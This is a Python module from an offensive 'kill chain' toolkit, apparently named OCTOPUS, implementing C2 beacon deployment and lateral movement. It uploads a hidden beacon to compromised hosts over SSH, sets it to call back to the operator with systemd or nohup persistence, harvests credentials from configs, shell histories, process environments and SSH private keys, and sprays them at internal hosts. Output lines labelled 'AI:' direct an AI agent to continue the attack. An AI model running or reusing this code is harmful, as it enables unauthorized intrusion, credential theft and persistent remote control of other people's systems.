#!/usr/bin/env python3
"""
Stage 7: Lateral movement and C2 beacon deployment.
"""

import os
import re
import time
import socket
import shutil
import subprocess
import concurrent.futures

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_wordlist, find_all_wordlists
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"


# ═══════════════════════════════════════════════
# PARAMIKO SSH HELPERS (shared across stages)
# ═══════════════════════════════════════════════


def _get_our_ip() -> str:
    """Get our external IP for reverse shells."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return ""


# ═══════════════════════════════════════════════
# C2 BEACON DEPLOYMENT
# ═══════════════════════════════════════════════

def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str:
    """
    Deploy the OCTOPUS C2 beacon to the compromised host.
    Uses base64 to upload the payload and systemd.py plugin for persistence.
    """
    print(f"\n  {C_MAGENTA}[KILL CHAIN] C2 Beacon Deployment — {user}@{host}{C_RESET}")
    output = f"[KILL CHAIN — C2 BEACON DEPLOYMENT — {user}@{host}:{port}]\n{'═' * 60}\n\n"

    client, err = _ssh_connect(host, user, password, port)
    if err:
        return output + f"[!] SSH connection failed: {err}\n"

    try:
        whoami = _ssh_exec(client, "id", timeout=5)
        is_root = "uid=0" in whoami

        # Read local agent payload
        agent_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads/agent.py")
        if not os.path.isfile(agent_path):
            # Fallback path if running from another directory
            agent_path = os.path.expanduser("~/OCTOPUS/payloads/agent.py")
            if not os.path.isfile(agent_path):
                return output + f"[!] Local agent payload not found at {agent_path}\n"

        with open(agent_path, "r") as f:
            agent_code = f.read()

        # Configure agent to point back to our IP
        our_ip = _get_our_ip()
        if not our_ip:
            our_ip = "127.0.0.1" # Fallback

        agent_code = agent_code.replace('C2_HOST = "127.0.0.1"', f'C2_HOST = "{our_ip}"')
        # Use the hardcoded campaign PSK for now
        psk = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
        agent_code = agent_code.replace('psk: str,', f'psk: str = "{psk}",')
        
        # Upload via base64
        import base64
        encoded = base64.b64encode(agent_code.encode("utf-8")).decode("utf-8")
        
        target_path = "/var/tmp/.sys_update"
        print(f"    {C_CYAN}[*] Uploading beacon payload to {target_path}...{C_RESET}")
        
        _ssh_exec(client, f"echo '{encoded}' | base64 -d > {target_path}", timeout=10)
        _ssh_exec(client, f"chmod +x {target_path}", timeout=5)
        
        # Verify upload
        check = _ssh_exec(client, f"ls -la {target_path}", timeout=5)
        if ".sys_update" in check:
            output += f"[+] Uploaded C2 beacon to {target_path}\n"
            print(f"    {C_GREEN}[+] Beacon uploaded successfully{C_RESET}")
        else:
            return output + "[-] Failed to upload beacon payload\n"

        # Persistence via systemd
        if is_root:
            print(f"    {C_CYAN}[*] Establishing systemd persistence for beacon...{C_RESET}")
            try:
                from plugins.persistence.systemd import SystemdPersistence
                plugin = SystemdPersistence()
                res = plugin.run(target=host, ssh_client=client, payload_path=f"python3 {target_path}")
                
                if res.get("status") == "success":
                    output += f"[+] C2 beacon persistence established via systemd ({res['data']['service']})\n"
                    print(f"    {C_GREEN}[+] Systemd persistence established{C_RESET}")
                else:
                    output += f"[-] Failed to establish systemd persistence: {res.get('error')}\n"
                    _ssh_exec(client, f"nohup python3 {target_path} >/dev/null 2>&1 &", timeout=5)
                    output += "[+] Executed beacon in background (nohup)\n"
            except ImportError:
                output += "[-] Systemd persistence plugin not found.\n"
                _ssh_exec(client, f"nohup python3 {target_path} >/dev/null 2>&1 &", timeout=5)
                output += "[+] Executed beacon in background (nohup)\n"
        else:
            print(f"    {C_YELLOW}[*] Non-root access — running beacon in background...{C_RESET}")
            # Try to run in background
            _ssh_exec(client, f"nohup python3 {target_path} >/dev/null 2>&1 &", timeout=5)
            output += "[+] Executed beacon in background (nohup) — persistence requires root\n"

        output += "\nAI: C2 Beacon successfully deployed. Agent should register with C2 server shortly.\n"

    except Exception as e:
        output += f"[-] Beacon deployment failed: {str(e)}\n"
        
    finally:
        client.close()

    return output


# ═══════════════════════════════════════════════
# STAGE 5: LATERAL MOVEMENT (paramiko-based)
# ═══════════════════════════════════════════════

def lateral_move(host: str, user: str, password: str, port: int = 22,
                 extra_creds: list = None) -> str:
    """
    Lateral movement via paramiko.
    1. SSH into compromised host
    2. Discover internal network (arp, routes, hosts)
    3. Extract credentials from config files
    4. Try found credentials against discovered internal hosts
    """
    print(f"\n  {C_BLUE}[KILL CHAIN] Stage 5: Lateral Movement — {user}@{host}{C_RESET}")
    output = f"[KILL CHAIN — LATERAL MOVEMENT — {user}@{host}:{port}]\n{'═' * 60}\n\n"

    client, err = _ssh_connect(host, user, password, port)
    if err:
        return output + f"[!] SSH connection failed: {err}\n"

    discovered_hosts = set()
    discovered_creds = list(extra_creds or [])
    # Always include the creds we already have
    discovered_creds.append({"user": user, "password": password})
    compromised_hosts = []

    try:
        # ── PHASE 1: Network Discovery ───────────────────────────
        print(f"    {C_CYAN}[*] Phase 1: Internal network discovery...{C_RESET}")

        # ARP table
        arp = _ssh_exec(client, "arp -an 2>/dev/null || ip neigh 2>/dev/null", timeout=10)
        for match in re.finditer(r'(\d+\.\d+\.\d+\.\d+)', arp):
            ip = match.group(1)
            if ip not in ("0.0.0.0", "255.255.255.255", "127.0.0.1", host):
                discovered_hosts.add(ip)

        # /etc/hosts
        hosts_file = _ssh_exec(client, "cat /etc/hosts 2>/dev/null", timeout=5)
        for match in re.finditer(r'^(\d+\.\d+\.\d+\.\d+)\s', hosts_file, re.MULTILINE):
            ip = match.group(1)
            if ip not in ("0.0.0.0", "127.0.0.1", "127.0.1.1", host):
                discovered_hosts.add(ip)

        # Subnet scan via ping sweep (fast)
        our_subnet = _ssh_exec(client, "ip -4 addr show | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}'", timeout=5)
        subnet_cidr = our_subnet.strip().split("\n")[0] if our_subnet else ""
        if subnet_cidr:
            output += f"Internal subnet: {subnet_cidr}\n"
            # Quick ping sweep
            base = ".".join(subnet_cidr.split(".")[:3])
            ping_result = _ssh_exec(client,
                f"for i in $(seq 1 254); do (ping -c1 -W1 {base}.$i | grep 'from' &); done 2>/dev/null | sort",
                timeout=30)
            for match in re.finditer(r'from (\d+\.\d+\.\d+\.\d+)', ping_result):
                ip = match.group(1)
                if ip != host:
                    discovered_hosts.add(ip)

        # Internal listening services (from compromised host perspective)
        internal_svcs = _ssh_exec(client, "ss -tlnp 2>/dev/null | grep LISTEN", timeout=5)
        output += f"\nInternal services on compromised host:\n{internal_svcs}\n"

        output += f"\n[DISCOVERED INTERNAL HOSTS: {len(discovered_hosts)}]\n"
        for h in sorted(discovered_hosts):
            output += f"  → {h}\n"

        # ── PHASE 2: Credential Harvesting ───────────────────────
        print(f"    {C_CYAN}[*] Phase 2: Credential harvesting...{C_RESET}")

        # Search for credentials in config files
        cred_searches = [
            ("MySQL configs", "grep -rs 'password' /etc/mysql/ /etc/my.cnf 2>/dev/null | head -10"),
            ("PHP configs", "grep -rs 'password\\|passwd' /var/www/ /opt/ 2>/dev/null | grep -v '.js' | head -15"),
            ("SSH private keys", "find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -5"),
            ("History files", "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE 'password|ssh|mysql|pass=' | head -20"),
            ("Environment vars", "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|key|token' | head -15"),
            (".env files", "find / -name '.env' -o -name 'env.local' 2>/dev/null | head -5"),
            ("wp-config.php", "cat /var/www/*/wp-config.php 2>/dev/null | grep -E 'DB_|define'"),
            ("Netrc files", "cat /root/.netrc /home/*/.netrc 2>/dev/null"),
            ("pgpass files", "cat /root/.pgpass /home/*/.pgpass 2>/dev/null"),
        ]

        for label, cmd in cred_searches:
            result = _ssh_exec(client, cmd, timeout=10)
            if result and "[!]" not in result and "No such file" not in result:
                output += f"\n[{label}]\n{result[:1000]}\n"
                # Extract passwords from results
                for match in re.finditer(r"(?:password|passwd|pass|secret)\s*[=:]\s*['\"]?(\S+?)['\"]?\s", result, re.IGNORECASE):
                    pwd = match.group(1)
                    if len(pwd) > 2 and len(pwd) < 100 and pwd not in ("", "*", "x", "!"):
                        discovered_creds.append({"user": "root", "password": pwd})
                        discovered_creds.append({"user": "admin", "password": pwd})

        # Read SSH private keys for key-based lateral movement
        ssh_keys = _ssh_exec(client, "find / -name id_rsa -o -name id_ed25519 2>/dev/null", timeout=10)
        private_keys = []
        for key_path_line in ssh_keys.splitlines():
            key_path_clean = key_path_line.strip()
            if key_path_clean and os.path.sep in key_path_clean:
                key_content = _ssh_exec(client, f"cat {key_path_clean} 2>/dev/null", timeout=5)
                if "PRIVATE KEY" in key_content:
                    output += f"\n[+] SSH PRIVATE KEY found: {key_path_clean}\n"
                    output += f"{key_content[:200]}...\n"
                    private_keys.append(key_content)

        # Deduplicate creds
        seen_creds = set()
        unique_creds = []
        for cred in discovered_creds:
            key = f"{cred['user']}:{cred['password']}"
            if key not in seen_creds:
                seen_creds.add(key)
                unique_creds.append(cred)
        discovered_creds = unique_creds

        output += f"\n[CREDENTIALS POOL: {len(discovered_creds)}]\n"
        for cred in discovered_creds[:20]:
            output += f"  {cred['user']}:{cred['password']}\n"

        # ── PHASE 3: Try credentials against discovered hosts ────
        if discovered_hosts and discovered_creds:
            print(f"    {C_CYAN}[*] Phase 3: Trying credentials against {len(discovered_hosts)} internal hosts...{C_RESET}")

            for target_ip in sorted(discovered_hosts):
                # Check if SSH is open on internal host (from compromised host)
                ssh_check = _ssh_exec(client,
                    f"timeout 3 bash -c 'echo > /dev/tcp/{target_ip}/22' 2>/dev/null && echo OPEN || echo CLOSED",
                    timeout=5)

                if "OPEN" not in ssh_check:
                    output += f"\n  [{target_ip}] SSH port closed, skipping\n"
                    continue

                output += f"\n  [{target_ip}] SSH OPEN — trying credentials...\n"

                for cred in discovered_creds[:10]:  # Limit to prevent lockout
                    try:
                        # Use paramiko through the pivot
                        # First try direct connection from our machine
                        pivot_client, pivot_err = _ssh_connect(
                            target_ip, cred["user"], cred["password"], timeout=8
                        )
                        if pivot_client:
                            pivot_whoami = _ssh_exec(pivot_client, "id; hostname")
                            pivot_client.close()
                            compromised_hosts.append({
                                "host": target_ip,
                                "user": cred["user"],
                                "password": cred["password"],
                                "whoami": pivot_whoami
                            })
                            output += f"    [+] LATERAL MOVEMENT SUCCESS: {cred['user']}@{target_ip}\n"
                            output += f"        {pivot_whoami}\n"
                            print(f"    {C_GREEN}[+] COMPROMISED: {cred['user']}@{target_ip}{C_RESET}")
                            break  # Move to next host
                    except Exception as e:
                        continue

                    time.sleep(0.5)  # Avoid rate limiting on internal hosts

        output += f"\n{'═' * 60}\n"
        output += f"Internal hosts discovered: {len(discovered_hosts)}\n"
        output += f"Credentials in pool: {len(discovered_creds)}\n"
        output += f"Hosts compromised via lateral movement: {len(compromised_hosts)}\n"

        if compromised_hosts:
            output += "\n[COMPROMISED HOSTS]\n"
            for ch in compromised_hosts:
                output += f"  ✓ {ch['user']}@{ch['host']} — {ch['whoami'][:80]}\n"
            output += "\nAI: Lateral movement successful! Run kill chain on compromised hosts too.\n"
        else:
            output += "\nAI: No lateral movement achieved. Try port forwarding for internal services.\n"

    finally:
        client.close()

    return output


# ═══════════════════════════════════════════════
# STAGE 6: DATA EXFILTRATION
# ═══════════════════════════════════════════════


